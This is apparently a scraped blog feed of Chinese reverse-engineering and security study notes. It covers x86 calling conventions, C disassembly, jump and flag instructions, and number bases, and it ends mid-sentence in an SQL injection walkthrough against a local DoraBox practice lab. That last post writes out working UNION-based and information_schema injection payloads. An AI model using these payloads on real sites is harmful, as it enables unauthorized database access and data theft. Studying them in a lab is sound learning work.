ESP,8命令整理栈。调用者main()函数直接清理其压入栈的函数参数，这样的方式即是cdecl。 stdcallstdcall常用于win32 api，在往后的VB中很常见。这个是自身函数内部进行栈清理。若想使用stdcall方式编译源码，只要使用_ stdcall关键字即可。栈的清理工作由add(函数中最后( 40100F)的RETN 8命令来执行。RETN 8命令的含义为RETN+POP 8字节，即返回后使ESP增加到指定大小。 像这样在被调用者add)函数内部清理栈的方式即为stdcall方式。stdcall方式的好处在于， 被调用者函数内部存在着栈清理代码，与每次调用函数时都要用ADD ESP,XXX命令的cdecI方式相比，代码尺寸要小。 虽然Win 32 API是使用C语言编写的库，但它使用的是stdcall方式，而不是C语言默认的cdecl方式。这是为了获得更好的兼容性，使C语言之外的其他语言( Delphi(Pascal)、Visual Basic等)也能直接调用API。 fastcallfastcal方式与stdcall方式基本类似，但该方式通常会使用寄存器(而非栈内存)去传递那些需要传递给函数的部分参数(前2个)。若某函数有4个参数，则前2个参数分别使用ECX、EDX寄存器传递。 顾名思义，fastcall方式的优势在于可以实现对函数的快速调用(从CPU的立场看，访问寄存器的速度要远比内存快得多)。单从函数调用本身来看，fastcall方式非常快，但是有时需要额外的系统开销来管理ECX、EDX寄存器。倘若调用函数前ECX与EDX中存有重要数据，那么使用它们前必须先备份。此外,如果函数本身很复杂，需要把ECX、EDX寄存器用作其他用途时，也需要将它们中的参数值存储到另外某个地方。有舍也有得。 就跟这种情况，一定要注意其是直接用寄存器来传参和计算的，不涉及栈，不过这个不常用。这个就是常用的情况，传参的时候会把部分的参数用寄存器来传。 第一次完整逆一个exe（CallingConvention.exe）汇编分析简单一看，这个就是停在winmain入口了，注意寻找前面所说的那个找call之前有3个参数压栈最为函数参数的语句，一直单步走：疑似出现符合的情况，这时候按F7进去查看内部：简单一看，就是我们要找的main函数。接下来为了加强分析可观性，我把汇编代码都放进了WPS中进行分析：（箭头指的不是特别好……） 逆成c代码#include &quot;stdafx.h&quot; int __stdcall plus2(int a,int b,int c) { return a+b+c; } int __cdecl plus3(int a,int b) { return a+b; } int __fastcall plus(int a,int b,int c,int d,int e) { int z,s; z=plus2(a,b,c); s=plus3(b,a); return plus3(z,s); } int main(int argc, char* argv[]) { int x; x=plus(1,3,4,6,7); printf(&quot;%d\\n&quot;,x); return 0; }这个练习过程其实是十分艰难的，我分析了有一个小时左右，主要是 开始对局部变量有些生疏，函数内部定义一个变量后汇编中会如何显示、 fastcall的认识不是很好 传入的6 7做了什么也不是很清楚最后结合ida生成的伪代码才完成，不过经过这个练习都学到了很多，使用ida也感受到了ida的强大，学到了在其中如何看一些简单的函数以及其与真正汇编代码的区别。","categories":[],"tags":[{"name":"c与汇编","slug":"c与汇编","permalink":"http://chumen77.xyz/tags/c与汇编/"}]},{"title":"C语言与反汇编学习（一）","slug":"C语言与反汇编学习（一）","date":"2019-10-19T02:26:17.000Z","updated":"2020-02-28T07:53:48.000Z","comments":true,"path":"2019/10/19/C语言与反汇编学习（一）/","link":"","permalink":"http://chumen77.xyz/2019/10/19/C语言与反汇编学习（一）/","excerpt":"","text":"C语言与反汇编学习（一）前言：本课主要学习VC开发环境的简单使用，和几个函数反汇编分析。 简单下熟悉VC6开发环境这里我直接用了编程达人的vc虚拟机，官方的vc6.0不是很好用，每次只支持调试一次，人家的可以突破这个限制。 创建项目 执行过程代码编写–&gt;生成EXE(F7)–&gt;运行(F5)–&gt;结束运行(Shift+F5) 一些简单操作设置断点设置断点是光标放到哪行代码后按下F9即可，这也是后面很多操作的最重要的起初操作。 调出寄存器，栈，内存窗口调出寄存器，栈，内存窗口看图，在空白处右击点击一下你需要的窗口就好了。 进入反汇编窗口在程序运行时，且有适当断点的时候，看图 右击程序框内的空白处，然后点击GO to Disassembly 就好了。在这里面最重要的操作就是：F10 F11分别是步过和步入。这个跟od里不一样。 C语言的调用1、无参数，无返回值的函数调用2、有参数，无返回值的函数调用3、无参数，有返回值的函数调用4、有参数，有返回值的函数调用 函数的反汇编分析-空函数先上c：#include &quot;stdafx.h&quot; void Function() { } int main(int argc, char* argv[]) { Function() return 0; }反汇编分析： 函数的反汇编分析-简单功能两个数相加：c代码：#include &quot;stdafx.h&quot; void Plus(int x,int y) { return x+y; } int main(int argc, char* argv[]) { Plus(2,1); return 0; }反汇编分析： 三个数相加：c代码：#include &quot;stdafx.h&quot; void Plus(int x,int y，int z) { return x+y; } int main(int argc, char* argv[]) { Plus(2,1,3); return 0; }反汇编分析：（和上面那个基本一样，只是为了练习，不详细写了） 函数的反汇编分析-嵌套调用要求：编写一个函数，能够实现对任意5个整数实现加法(使用Plus1和Plus2). c代码#include &quot;stdafx.h&quot; int Plus1(int x,int y) { return x+y; } int Plus2(int x,int y,int z) { return x+y+z; } int Plus3(int a,int b,int c,int d,int e) { int i,j,m; i=Plus1(a,b); j=Plus2(c,d,e); m=Plus1(i,j); return m; } int main(int argc, char* argv[]) { Plus3(2,1,3,1,5); return 0; }反汇编分析：（中间调用一个Plus1 和 Plus2，就不必进入分析了，基本跟前面简单分析那两个一样，这个练习是顺成下来的。） 总结：学完汇编了，就接着C与汇编结合分析，步步把常见的结合分析完。这次学习与练习，可以一整段一整段的读汇编代码了，（这个前面其实还有画过堆栈图，当时是一句句分析学习的，为了熟悉堆栈和汇编语句，找时间补下笔记）也熟悉了函数是如何嵌套调用的。","categories":[],"tags":[{"name":"c与汇编","slug":"c与汇编","permalink":"http://chumen77.xyz/tags/c与汇编/"}]},{"title":"JCC学习","slug":"JCC","date":"2019-10-07T15:09:50.000Z","updated":"2020-09-08T00:02:11.645Z","comments":true,"path":"2019/10/07/JCC/","link":"","permalink":"http://chumen77.xyz/2019/10/07/JCC/","excerpt":"","text":"JCC学习JCC指令集合详细__1、JE, JZ 结果为零则跳转(相等时跳转) ZF=1 2、JNE, JNZ 结果不为零则跳转(不相等时跳转) ZF=0 3、JS 结果为负则跳转 SF=1 4、JNS 结果为非负则跳转 SF=0 5、JP, JPE 结果中1的个数为偶数则跳转 PF=1 6、JNP, JPO 结果中1的个数为偶数则跳转 PF=0 7、JO 结果溢出了则跳转 OF=1 8、JNO 结果没有溢出则跳转 OF=0 9、JB, JNAE 小于则跳转 (无符号数) CF=1 10、JNB, JAE 大于等于则跳转 (无符号数) CF=0 11、JBE, JNA 小于等于则跳转 (无符号数) CF=1 or ZF=1 12、JNBE, JA 大于则跳转(无符号数) CF=0 and ZF=0 13、JL, JNGE 小于则跳转 (有符号数) SF≠ OF 14、JNL, JGE 大于等于则跳转 (有符号数) SF=OF 15、JLE, JNG 小于等于则跳转 (有符号数) ZF=1 or SF≠ OF 16、JNLE, JG 大于则跳转(有符号数) ZF=0 and SF=OF 表格总结 直接摘抄的做的很详细，正好有助记，但是需要和上面详细指令搭配使用，要注意那些有符号的JCC跳转指令，因为在这个表里没有体现。也不用太着急背，熟悉一下就可以了，有部分是可以直接记住的，在往后遇到模糊的直接查下就可以了。 注意：JCC指令决定它跳不跳转跟别的没关系，只跟EFLAG标志寄存器有关系，根据符号位来进行跳转的 练习使用汇编指令修改标志寄存器中的某个位的值，实现JCC的十六种跳转.前提：能用CMP和TEST实现的优先考虑. 1、JE, JZ 结果为零则跳转(相等时跳转) ZF=1MOV AL,1 MOV CL,1 CMP AL,CL JE 0X0040102B 2、JNE, JNZ 结果不为零则跳转(不相等时跳转) ZF=0MOV AL,1 TEST AL,AL JNZ 0X00401006 3、 JS 结果为负则跳转 SF=1MOV AL,1 MOV CL,2 CMP AL,CL 4、 JNS 结果为非负则跳转 SF=0XOR EAX,EAX JNS 0X0040102F 5、 JP, JPE 结果中1的个数为偶数则跳转 PF=1MOV AL,2 MOV CL,2 CMP AL,CL JPE 0X00401008 6、JNP, JPO 结果中1的个数为奇数则跳转 PF=0MOV AL,2 MOV CL,1 CMP AL,CL JPE 0X00401008 7、 JO 结果溢出了则跳转 OF=1MOV AL,80 SUB AL,10 JO 0X00401008 8、 JNO 结果没有溢出则跳转 OF=0MOV AX,0FFFF ADD AX,80 JNO 0X00401010 9、 JB, JNAE 小于则跳转 (无符号数) CF=1MOV AX,80 MOV CX,90 CMP AX,CX JB 0X0040103E 10、 JNB, JAE 大于等于则跳转 (无符号数) CF=0MOV AX,80 MOV CX,90 CMP CX,AX JB 0X00401044 11、 JBE, JNA 小于等于则跳转 (无符号数) CF=1 or ZF=1一种直接跟练习9一样直接构造让CF=1或者让跟练习1让ZF=0就可以了。 MOV AL,1 MOV CL,1 CMP AL,CL JE 0X0040102B 或者 MOV AX,80 MOV CX,90 CMP AX,CX JB 0X0040103E 12、 JNBE, JA 大于则跳转(无符号数) CF=0 and ZF=0MOV AX,80 MOV CX,90 CMP CX,AX JB 0X00401044 解析： 这个与练习10的区别就是不可以让两个数相等。 13、 JL, JNGE 小于则跳转 (有符号数) SF≠ OFMOV AL,0XFF MOV CL,0X01 CMP AL,CL JB 0X00401063 JL 0X00401063 解析：终于到了让我十分迷惑的有无符号JCC的跳转指令，这里做了对比JB JL,看标志位肯定能解决一切（这是对计算机来说），我们没看标志位提前做判断的诀窍：就是当你用有符号数JCC指令（JG,JL,JLE,JGE，JNG，JNL,JNGE，JNLE）的时候，一定要把两个操作数直接人工看做有符号来看！ 比如这个练习用到了JL,FF就是-1了，那么-1&lt;1这个肯定的，所以JL跳转。但是对于JB，FF就是FF肯定大于1，所以没有跳转。 14、 JNL, JGE 大于等于则跳转 (有符号数) SF=OFMOV AL,1 MOV CL,0CC CMP AL,CL JGE 0X0040108B 15、 JLE, JNG 小于等于则跳转 (有符号数) ZF=1 or SF≠ OFMOV AL,1 MOV CL,0CC CMP CL,AL JGE 0X0040108B 这个就是对立15练习，想利用ZF等于1这个跳转，在cmp中没什么好整的，这两个操作数只能是相同的数，没什么看不看做有无符号的说法。 16、 JNLE, JG 大于则跳转(有符号数) ZF=0 and SF=OFMOV AX,1 MOV CX,FF CMP AX,CX JG 0x004010A6 MOV AL,1 MOV CL,0FF CMP AL,CL JG 0x004010A6 解析： 判断一下，第1段代码对还是第2段代码对？ 在原来的观点，对有符号JCC要把两个操作数看做转化后的有符号数对待，且一定要注意下数据宽度。在这个例子中，第一段代码是无法实现JG跳转的，因为其数据宽度的问题，影响到SF,所以其没办法SF=OF就没法跳转。","categories":[],"tags":[{"name":"c与汇编","slug":"c与汇编","permalink":"http://chumen77.xyz/tags/c与汇编/"}]},{"title":"标志寄存器","slug":"标志寄存器","date":"2019-10-06T14:01:14.000Z","updated":"2020-09-08T00:02:21.792Z","comments":true,"path":"2019/10/06/标志寄存器/","link":"","permalink":"http://chumen77.xyz/2019/10/06/标志寄存器/","excerpt":"","text":"标志寄存器部分标志寄存器详细介绍需要先熟练记住这几个寄存器的位置和名称：CF PF AF ZF SF OF CF进位标志CF(Carry Flag):如果运算结果的最高位产生了一个进位或借位，那么，其值为1，否则其值为0。 解析：在看运算结果的时候，先提前确定好参与运算的数是有无符号数和它们的数据宽度。其与PF的难辨难分，重点是看参与运算的数是否为无符号数，这个是程序员写代码的时候定义的。默认都是有符号的，这就主要看后面的PF了。 PF奇偶标志PF(Parity Flag)：PF标志位，根据结果中最低有效字节(最低8位)中“1”的个数来确定置1还是清0。如果“1”的个数为偶数，则PF的值为1，否则其值为0。 解析：这个在很多教材中是错的，这个需要强调根据的是运算结果的最低有效字节，也就是最低8位里面1的个数。 AF辅助进位标志AF(Auxiliary Carry Flag)：如果在“加”操作期间从低半字节（最低四位）到高半字节（高四位）有进位，或者在减法期间的低8位部分从高半字节到低半字节有借位，则将辅助标志设置为（1）。否则，如果不发生这种进位或借位，则清除标志或将其“复位”（设置为0）。—-（维基百科） 辅助迸位标志:算数操作結果的第三位〈从0幵始计数〉如果发生了迸位或者借位則將其置为1,否則为0,常在BCD(binary-codedecimal)算木迄算中被使用。—（百度百科） 解析：这个还是在很多资料上是错误的，在x86汇编上正确解释如上，也就是在D0-D7中，D3向D4位进位或者借位，才会置1。（这个当初老师讲错、百度高赞也是错的，要注意一下）。 ZF零标志ZF(Zero Flag)：零标志ZF用来反映运算结果是否为0。如果运算结果为0，则其值为1，否则其值为0。在判断运算结果是否为0时，可使用此标志位。解析：引一下常用的xor r8/16/32,r8/16/32对寄存器清零操作。 SF符号标志SF(Sign Flag)：符号标志SF用来反映运算结果的符号位，它与运算结果的最高位相同。 解析：还是需要确定数据宽度，看好到底哪个是最高位，然后把它换成2进制确定最高位是0还是1.例子： MOV AL,20 MOV CX,8000 ADD AX,CX 这个就是在字上操作，然后相加结果是8020,最高位就是1000，那这个SF就是1了。要注意一下这个sf标志也是看数据宽度的。 OF溢出标志OF(Overflow Flag)：溢出标志OF用于反映有符号数加减运算所得结果是否溢出。如果运算结果超过当前运算位数所能表示的范围，则称为溢出，OF的值被置为1，否则，OF的值被清为0。 解析：这个常与CF混淆，以为他们没啥区别，但是这个才是正宗的计算机看是否溢出的标志位。 CF与SF区别： 进位标志表示无符号数运算结果是否超出范围. 溢出标志表示有符号数运算结果是否超出范围. 溢出主要是给有符号运算使用的，在有符号的运算中，有如下的规律： 正 + 正 = 正 如果结果是负数，则说明有溢出 负 + 负 = 负 如果结果是正数，则说明有溢出 正 + 负 永远都不会有溢出.结合这个图在应为对PF的判断，非常好用。判断的时候，一定注意PF是在有符号数做运算的时候去看的，无符号直接看CF就好了。 练习写汇编指令只影响CF位的值MOV AL,0FE ADD AL,10 写汇编指令只影响PF位的值MOV AL,1 ADD AL,2 写汇编指令只影响AF位的值MOV EAX,0F ADD EAX,1 写汇编指令只影响SF位的值MOV CL,0F1 ADD CL,1 写汇编指令只影响OF位的值MOV AL,80 SUB AL,10 这个需要重视下，练习的时候有点受思维限制了。没有想到用SUB来构造出，站在80的位置顺时针查10，负-正=正，来实现溢出完成只影响OF位。","categories":[],"tags":[{"name":"c与汇编","slug":"c与汇编","permalink":"http://chumen77.xyz/tags/c与汇编/"}]},{"title":"数据宽度与逻辑运算","slug":"数据宽度与逻辑运算","date":"2019-10-01T13:08:32.000Z","updated":"2020-02-24T04:28:05.000Z","comments":true,"path":"2019/10/01/数据宽度与逻辑运算/","link":"","permalink":"http://chumen77.xyz/2019/10/01/数据宽度与逻辑运算/","excerpt":"","text":"数据宽度与逻辑运算数据宽度数学上的数字，是没有大小限制的，可以无限的大。但在计算机中，由于受硬件的制约，数据都是有长度限制的（我们称为数据宽度），超过最多宽度的数据会被丢弃。 对数据宽度的理解和有无符号数4位宽度表示4位宽度表示：假设计算机只能存储4位2进制数： 0000 0001 0010 0011 0100 0101 0110 0111 1000 1001 1010 1011 1100 1101 1110 1111 0 1 2 3 4 5 6 7 8 9 A B C D E F 存无符号数时：0 1 2 3 4 5 6 7 8 9 A B C D E F存有符号数时： 正数：0 1 2 3 4 5 6 7 负数：-1 -2 -3 -4 -5 -6 -7 -8 其中对应关系： -1 -2 -3 -4 -5 -6 -7 -8 F E D C B A 9 8 无符号数时：从0到F逆时针依次增大。 有符号数时：含义从圆中间劈开，正数负数各一半，在F处为最大负数，0处为最小的正数。 为什么在存有符号数时说开头为1的数就是负数？我们只看二进制：| 0 | 1 | 2 | 3 | 4 | 5 | 6 | 7 || — | — | — | — | — | — | — | — | — || 0000 | 0001 | 0010 | 0011 | 0100 | 0101 | 0110 | 0111 | -1 -2 -3 -4 -5 -6 -7 -8 1111 1110 1101 1100 1011 1010 1001 1000 很明显就可以看出，当二进制开头为1的时候对应存的数值就是负数了。 举例：对1011的理解 1011在我们当做是有符号时就是-5，无符号就是B。这个完全看我们如何去定义。 #### 8位宽度： 8位宽度表示：假设计算机只能存储8位2进制数。 无符号数：0 1 2 3 4 ……FF 有符号数：正数：0 1 2 3 4 5 6 7 …7F负数： -1 -2 -3 -4 -5 -6 -7 -8 …. -128 FF FE FD FC FB FA F9 F8 …. 80 16位宽度16位宽度表示：假设计算机只能存储16位2进制数无符号数：0 1 2 3 4 ……FFFF 有符号数：正数：0 1 2 3 4 5 6 7 …7FFF负数： -1 -2 -3 -4 -5 -6 -7 -8 …. -128 FFFF FFFE FFFD FFFC FFFB FFFA FFF9 FFF8 …. 8000 32位宽度32位宽度表示：假设计算机只能存储32位2进制数无符号数：0 1 2 3 4 ……FFFFFFFF 有符号数：正数：0 1 2 3 4 5 6 7 …7FFFFFFF负数： -1 -2 -3 -4 -5 -6 -7 -8 …. -128 FFFFFFFF FFFFFFFE FFFFFFFD FFFFFFFC FFFFFFFB FFFFFFFA FFFFFFF9 FFFFFFF8 …. 80000000 ### 几个本质问题 1：计算机除了0和1什么也不认识。 2：如果存的数据超过数据长度限制，超过的会直接抛弃。 3：有符号数和无符号数是我们自己用的时候定义的，定义是什么就是什么。 ### 几个重要的计量单位： BYTE 字节 8BIT WORD 字 16BIT 2字节 DWORD 双字 32BIT 4字节 逻辑运算二进制的逻辑运算：or：或(or |) 只要有一个为1就是1 and：与(and &amp;)两个都为1才是1 xor异或（xor) 不一样为1ps：错位了。。。 not非(not !) 1是0 0是1 逻辑运算的具体应用：想获取某个值得第N位的值是1还是0如：8F 方法：想看下第四位是0还是1，就写个第四个位为1其他都为0的数，然后进行一个与运算，如果出来结果是1.那就证明第四位就是1。 最简单的加密算法：如：要加密的数据：2015密钥：54因为密钥是两位的，所以要对2015分为20和15。进行一次xor运算，出来就是加密后的值：74 41当用他俩再进行一次xor运算：就又变成了2015。这就完成了加密解密。","categories":[],"tags":[]},{"title":"进制学习","slug":"进制学习","date":"2019-09-28T03:52:16.000Z","updated":"2019-10-17T16:01:09.000Z","comments":true,"path":"2019/09/28/进制学习/","link":"","permalink":"http://chumen77.xyz/2019/09/28/进制学习/","excerpt":"","text":"进制学习进制的定义十进制的定义:由十个符号组成，分别是0 1 2 3 4 5 6 7 8 9逢十进一。 九进制的定义:由九个符号组成，分别是0 1 2 3 4 5 6 7 8逢九进一。 十六进制的定义:由十六个符号组成，分别是0 1 2 3 4 5 6 7 8 9 A B C D E F 进制的本质例如十进制：0 1 2 3 4 5 6 7 8 9 其就是由10个符号组成。如果定义其为9 1 5 2 4 7 6 3 8 0,或者换成,如果用上面的符号进行加密与解密，让不懂进制本质的人解密有很大的阻碍。 二进制与十六进制的映射关系这个需要背会。 练习正常认知的进制：二进制从0写到100 七进制编制7进制加法表，乘法表，并计算下面的结果：23456+54356=？5621-654=？234*65=？7进制加法表：7进制乘法表：粗略计算过程：本质就是直接查表了。 十六进制：编制16进制加法表，乘法表，并计算下面的结果：2D4E6+CF3A6=？5FD1-E5A=？2CA*A5=？16进制加法：16进制乘法表：粗略计算过程： 都是查表。 面向本质的非认知进制：一：9进制定义：由9个符号组成，分别是：2、9、1、7、6、5、4、8、3，逢9进1 计算：123 + 234 = ? 先画个进制表：然后计算： 解题过程:1)最后一位3+4中的4是第6个数，所以3+4 可以看成从3向后数6个为95，取最后一个5且有一个进位2)最后第二位2+3中的2是第0个数，所以2+3相当3，有一个进位，需要再向后查一个是92，取最后一位2且进1位3)第一位1+2中的2是第0个数，所以1+2相当于1，有一个进位，要再向后查一个，再查一位是7，所以最后是725 二：10进制定义：由10个符号组成，分别是：!、@、$、%、^、&amp;、*、A、B、C，逢10进1 计算：@$$B + %AC&amp; = ? 先画个进制表：然后计算： 解题过程：1)最后一位B+&amp;中的&amp;是第5个数，所以B+&amp;可以看成从B向后数5个为@%，取最后一个%且有一个进位2)最后第二位$+C中的C是第9个数，所以$+C相当从$开始查9个数，前面有一个进位，需要再向后查一个是@$，取最后一位$且进1位3)最后第三位$+A中的A是第7个数，所以$+A相当于从$开始往后查7个，有一个进位，要再向后查一个，再查一位是@!，所以最后是!且进一位4)第一位的@+%中的@是第一个数，所以@+%相当于从%在往后查一位，因为有个进位所以再往后查一位就是&amp;。所以答案就是&amp;!$%。 总结：经过这次对进制的学习和练习，对进制理解更加的深刻，它们只是一堆符号，在达到某个程度后会进位罢了。在复习到c后，有时间可以学习一下写个进制加密的程序。","categories":[],"tags":[]},{"title":"逆向学习-滴水公开课","slug":"逆向学习-滴水公开课","date":"2019-09-27T15:14:39.000Z","updated":"2019-10-17T15:45:30.000Z","comments":true,"path":"2019/09/27/逆向学习-滴水公开课/","link":"","permalink":"http://chumen77.xyz/2019/09/27/逆向学习-滴水公开课/","excerpt":"","text":"逆向学习-滴水公开课知识总结一、内存的读写寻址公式一: [立即数]读取内存的值: MOV EAX,DWORD PTR DS:[0x13FFC4] MOV EAX,DYVORD PTR DS:[0x13FFC8] 向内存中写入数据: MOV DWORD PTR DS:[0x13FFC4],eax MOV DWORD PTR DS:[0x13FFC8].ebx 获取内存编号: LEA EAX,DWORD PTR DS:[0X13FFC4] LEA EAX,DWORD PTR DS:[ESP+8] 寻址公式二: [reg] reg代表寄存器可以是8个通用寄存器中的任意一个读取内存的值:MOV ECX,0x13FFD0 MOV EAX,DWORD PTR DS:[ECX] 向内存中写入数据:MOV EDX,0x13FFD8 MOV DWORD PTR DS:[EDX],0x87654321 获取内存编号:LEA EAX,DWORD PTR DS:[EDX] MOV EAX,DWORD PTR DS:[EDX] 寻址公式三: [reg+立即数]读取内存的值:MOV ECX,0x13FFD0 MOV EAX,DWORD PTR DS:[ECX+4] 向内存中写入数据:MOV EDX,0x13FFD8 MOV DWORD PTR DS:[EDX+0xC].0x87654321 获取内存编号:LEA EAX,DWORD PTR DS:[EDX+4] MOV EAX,DWORD PTR DS:[EDX+4] 寻址公式四：[reg+reg*（1 or 2 or 4 or 8）]读取内存的值:MOV EAX,13FFC4 MOV ECX,2 MOV EDX,DWORD PTR DS:[EAX+ECX*4] 向内存中写入数据:MOV EAX,13FFC4 MOV ECX,2 MOV DWORD PTR DS:[EAX+ECX*4],0x87654321 获取内存编号:LEA EAX,DWORD PTR DS:[EAX+ECX*4] 寻址公式五：[reg+reg*（1 or 2 or 4 or 8）+立即数]读取内存的值:MOV EAX,13FFC4 MOV ECX,2 MOV EDX,DWORD PTR DS:[EAX+ECX*4+4] 向内存中写入数据:MOV EAX,13FFC4 MOV ECX,2 MOV DWORD PTR DS:[EAX+ECX*4+4],0x87654321 获取内存编号:LEA EAX,DWORD PTR DS:[EAX+ECX*4+2] 二、堆栈变形的艺术:push eax代码相当于:lea esp,dword ptr ss:[esp-4] mov dword ptr ss:[esp],eax 或者 mov dword ptr ss:[esp-4],eax lea esp,dword ptr ss:[esp-4] 还有 sub esp,0x4 mov dword ptr ss:[esp],eax push esp代码相当于：mov dword ptr [esp-4],esp sub esp,0x4 还有： mov dword ptr [esp-4],esp lea esp,dword ptr [esp-4] pop eax 代码相当于：lea esp,dword ptr [esp+4] mov eax,dword ptr [esp-4] mov eax,dword ptr [esp] lea esp,dword ptr [esp+4] pop esp 代码相当于：add esp,0x4 mov esp,dword ptr[esp-4]或者 lea esp,dword ptr[esp+4] mov esp,dword ptr[esp-4] 两条简单指令stos ：将eax中的值放入edi所指地址的内存里。 rep ：是重复指令 ecx中放入重复的次数","categories":[],"tags":[]},{"title":"安卓程序分析环境搭建","slug":"安卓程序分析环境搭建","date":"2019-09-23T09:22:24.000Z","updated":"2019-10-17T15:45:31.000Z","comments":true,"path":"2019/09/23/安卓程序分析环境搭建/","link":"","permalink":"http://chumen77.xyz/2019/09/23/安卓程序分析环境搭建/","excerpt":"","text":"#安卓程序分析环境搭建 Mac下安卓SDK搭建：前提是已经安装了homebrew神器： 1：下载SDKbrew search android-sdk brew cask install android-sdk 2：配置环境变量vim .zshrc export ANDROID_SDK_ROOT=\"/usr/local/share/android-sdk\" export PATH=\"$&#123;PATH&#125;:$&#123;ANDROID_SDK_ROOT&#125;/tools:$&#123;ANDROID_SDK_ROOT&#125;/platform-tools\" !wq退出以后，source ~/.zshrc pwd /usr/local/share/android-sdk/tools/bin ./sdkmanager 然后会出现Warning: File /Users/gjy/.android/repositories.cfg could not be loaded.继续touch /Users/gjy/.android/repositories.cfg 3：检验是否搭建好在终端输入：android这就ok了。 安卓NDK搭建前提是已经安装了homebrew神器： 1：下载NDK：brew search android-ndk brew cask install android-ndk 2：配置环境变量：vim .zshrc export ANDROID_NDK_HOME=\"/usr/local/share/android-ndk\" //添加进去正常保存退出 source .zshrc 3：检验：ndk-build已经成功了。","categories":[],"tags":[]},{"title":"SQL注入基础学习","slug":"SQL基础学习","date":"2019-09-01T11:17:25.000Z","updated":"2020-08-10T03:50:09.666Z","comments":true,"path":"2019/09/01/SQL基础学习/","link":"","permalink":"http://chumen77.xyz/2019/09/01/SQL基础学习/","excerpt":"","text":"SQL注入基础学习数据类型（数字型）检测是否sql语句是否执行使用and,or,xor,like测试 ** 1=1 ** 1=2其中**可以为and or xor like任意一个ps：基本语句，注意真假逻辑关系，灵活进行测试。 使用符号测试 单引号 减号 数据类型（字符型）检测是否sql语句是否执行此处跟数字型测试办法基本一样，还是使用and,or,xor,like、单引号测试。最近接触字符型的注入较少，补充一下原理： 我们先进行正常查询：http://127.0.0.1/DoraBox/sql_injection/sql_string.php?title=DoraBox&amp;submit=submit当我们给接受处加&#39;：http://127.0.0.1/DoraBox/sql_injection/sql_string.php?title=DoraBox&#39;&amp;submit=submit语句执行后，会产生报错：然后我们想办法不让其报错，就是来省略后面那个php代码语句加的&#39;: 用#来注释，但需要进行url来转变一下为%23 用--+ --%20来注释然后就可以来用and or xor like来测试了，例如：http://127.0.0.1/DoraBox/sql_injection/sql_string.php?title=DoraBox&#39; and 1=1--+&amp;submit=submithttp://127.0.0.1/DoraBox/sql_injection/sql_string.php?title=DoraBox&#39; and 1=2--+&amp;submit=submit union知识小记union在集合两个select查询语句时，一定要注意两个查询出来的结果,列数（columns）要相等才会出来结果。例如：SELECT * from news union SELECT 1,2;报错，换成SELECT * from news union SELECT 1,2,3; order by 知识小记order by是按照一定规则来进行排序的语句。我们为什么能够通过order by排序，来排出来列名有多少个呢？我们来测试一下： SELECT * from test ORDER BY 1;当我们在测试到SELECT * from test ORDER BY 5;发现出了异常。我们换个3列的表：`SELECT * from newsORDER BY 3;`显示是正常的`SELECT * from newsORDER BY 4;`所以可以发现我们在order by后加数字可以来测出来一个表的列名个数。 显示联合查询出现的结果显示我们自定义查询的结果，该怎么实现呢。先在靶场测试：SELECT * FROM news WHERE id = 2 union select 1,2,3 from test 明显网页是不给显示的。相同语句在数据库：不给显示是因为服务器端php代码进行了处理，只可以显示出一条结果。那如果把第一个查询结果给无法显示，是不是就可以显示我们联合查询的结果呢。先在数据库测试下SQL语句：SELECT * FROM news WHERE id = -1发现是不显示东西的。继续测试:SELECT * FROM news WHERE id = -1 union select 1,2,3 from test;接着我们拿到靶场测试： 达到我们的目的了。看这个页面显示的效果2 3，反向思维考虑把2 3改成我们的列名是不是就可以出数据了，但是我们如何知道表里的列名呢？ exists（）函数小记exists()是验证某个语句是否存在结果，是个bool函数，存在显示1反之是0。SELECT * FROM news WHERE id=1 and exists(select * from test);在数据库进行测试:SELECT * FROM news WHERE id=1 and exists(select * from aa);发现在用这个函数查不存在的表的时候语句是没法进行的，然后我们可以通过这个语句来推出表名和列名，不过十分麻烦，可以通过burpsuit来跑。还有意外收获，可以看出数据库的名字pentest就是数据库的名字了。 数据类型（搜索型）%的作用%在mysql中表示通配符。在SQL语句中:******* like &#39;%a&#39;，就是搜索返回以字母a结尾的所有信息，同理a%%a%`,分别就是 搜索返回以字母a开头的所有信息和搜索返回包含字母a`的所有信息。 如何注入咱们先看下php源代码:$sql_search = &quot;SELECT * FROM {$t_name} WHERE {$c_name} like &#39;%{$c_value}%&#39;&quot;; //search很明显提前闭合&#39;%跟省略后面的%&#39;就可以了，所以http://127.0.0.1/DoraBox/sql_injection/sql_search.php?content=d%&#39; --+&amp;submit=submit 然后我们正常走步骤，利用order by来确定下多少列：http://127.0.0.1/DoraBox/sql_injection/sql_search.php?content=d%&#39; order by 3--+&amp;submit=submit继续http://127.0.0.1/DoraBox/sql_injection/sql_search.php?content=d%&#39; order by 4--+&amp;submit=submit可以确定是3列了。 然后开始确定表名，这次用刚刚学的exist()来测试，并且练习一下burp来跑表名和列名：先正常构造payload：http://127.0.0.1/DoraBox/sql_injection/sql_search.php?content=d%&#39; and exists(select * from news)--+&amp;submit=submit确定news表名存在，然后开始用burp跑其他的：我们是跑表名，所以在news加上变量。这个步骤需要先点然后在“添加“按钮旁的位置开始填入测试的表名，这个我是手动填的，可以进行导入字典。然后我们开始看结果Render下面显示正常就证明是存在的。这个是不存在。最终用这个办法可以跑出表名test、account。同样办法跑列名： 确定出news表中有id、title、content等列。 然后我们更新下语句来查表和列，exists()这个办法是有点老的比较笨。在MySQL&gt;5.1版本中，我们可以在information_schema发现这个我们的数据库和列名都可以直接看到，所以我们可以以下语句进行查询：第一步，我们先让其可以显示我们想查询的内容http://127.0.0.1/DoraBox/sql_injection/sql_search.php?content=mmmmmm%&#39; union select 1,2,3 from news--+&amp;submit=submit把标题下的2换成darabase()函数，来显示下数据库的名字。http://127.0.0.1/DoraBox/sql_injection/sql_search.php?content=mmmmmm%&#39; union select 1,database(),3 from news--+&amp;submit=submit然后我们就的得到了pentest，然后开始利用这个mysql&gt;5.1特性来构造语句：http://127.0.0.1/DoraBox/sql_injection/sql_search.php?content=mmmmmm%&#39; union select 1,table_name,3 from information_schema.tables where table_schema=&#39;pentest&#39;--+&amp;submit=submit但是在这里面怎么显示其他的名字呢？继续:http://127.0.0.1/DoraBox/sql_injection/sql_search.php?content=mmmmmm%&#39; union select 1,table_name,3 from information_schema.tables where table_schema=&#39;pentest&#39; and table_name!=&#39;account&#39;--+&amp;submit=submit其中可以将!=换成&lt;&gt;是同样的效果。继续在语句中加and和不等于前面查出的表的名字：http://127.0.0.1/DoraBox/sql_injection/sql_search.php?content=mmmmmm%&#39; union select 1,table_name,3 from information_schema.tables where table_schema=&#39;pentest&#39; and table_name!=&#39;account&#39; and 